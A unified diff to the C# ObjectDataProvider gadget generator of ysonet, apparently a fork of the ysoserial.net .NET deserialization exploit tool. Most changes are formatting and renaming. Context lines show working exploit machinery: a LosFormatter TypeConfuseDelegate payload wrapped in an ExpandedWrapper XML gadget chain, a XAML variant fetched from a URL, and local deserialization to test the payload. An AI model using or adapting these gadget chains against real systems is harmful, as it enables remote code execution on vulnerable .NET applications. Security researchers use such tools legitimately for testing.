@@ -1,17 +1,15 @@
-﻿using System;
-using System.Collections.Generic;
-using fastJSON;
-using System.Windows.Markup;
-using System.Diagnostics;
-using System.Windows.Data;
-using System.Reflection;
-using System.Collections.Specialized;
-using System.Windows;
-using ysonet.Helpers;
+﻿using fastJSON;
 using NDesk.Options;
+using System;
+using System.Collections.Generic;
+using System.Collections.Specialized;
+using System.Diagnostics;
 using System.Linq;
-using Polenter.Serialization;
+using System.Reflection;
 using System.Text;
+using System.Windows;
+using System.Windows.Data;
+using ysonet.Helpers;
 
 /*
  * NOTEs:
@@ -46,11 +44,6 @@ namespace ysonet.Generators
             return options;
         }
 
-        public override string Name()
-        {
-            return "ObjectDataProvider";
-        }
-
         public override string Finders()
         {
             return "Oleksandr Mirosh, Alvaro Munoz";
@@ -63,7 +56,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.NotBridgeNotDerived };
+            return new List<string> { GadgetTags.Independent };
         }
 
         public override object Generate(string formatter, InputArgs inputArgs)
@@ -98,9 +91,9 @@ namespace ysonet.Generators
                     payload = SerializersHelper.Xaml_serialize(myResourceDictionary);
 
                 }
-                else if(variant_number == 3)
+                else if (variant_number == 3)
                 {
-                    if(xaml_url == "")
+                    if (xaml_url == "")
                     {
                         Console.WriteLine("Url parameter was not provided.");
                         Console.WriteLine("Try 'ysonet --fullhelp' for more information.");
@@ -145,7 +138,8 @@ namespace ysonet.Generators
                     {
                         var staThread = new System.Threading.Thread(delegate ()
                         {
-                            try {
+                            try
+                            {
                                 SerializersHelper.Xaml_deserialize(payload);
                             }
                             catch (Exception err)
@@ -324,7 +318,7 @@ namespace ysonet.Generators
                 if (variant_number == 2)
                 {
                     IGenerator tcdGadget = new TypeConfuseDelegateGenerator();
-                    string losFormatterPayload = Encoding.UTF8.GetString((byte[]) tcdGadget.GenerateWithNoTest("LosFormatter", inputArgs));
+                    string losFormatterPayload = Encoding.UTF8.GetString((byte[])tcdGadget.GenerateWithNoTest("LosFormatter", inputArgs));
                     payload = $@"<?xml version=""1.0""?>
 <root type=""System.Data.Services.Internal.ExpandedWrapper`2[[System.Web.UI.LosFormatter, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"">
     <ExpandedWrapperOfLosFormatterObjectDataProvider xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance"" xmlns:xsd=""http://www.w3.org/2001/XMLSchema"" >
@@ -597,7 +591,7 @@ namespace ysonet.Generators
                     ""PublicKeyToken"": ""b77a5c561934e089""
                   }
                 },
-                ""Value"": """+ internalPayload + @"""
+                ""Value"": """ + internalPayload + @"""
               }
             ]
           }
@@ -667,7 +661,7 @@ namespace ysonet.Generators
                 allExclusions.Add(exclusionList);
 
                 // Why? I don't know but it seems to be another bug
-                ourExcludedProperties = new List<String>{"Dispatcher"};
+                ourExcludedProperties = new List<String> { "Dispatcher" };
                 exclusionList = new KeyValuePair<Type, List<String>>(odp.GetType(), ourExcludedProperties);
                 allExclusions.Add(exclusionList);
 
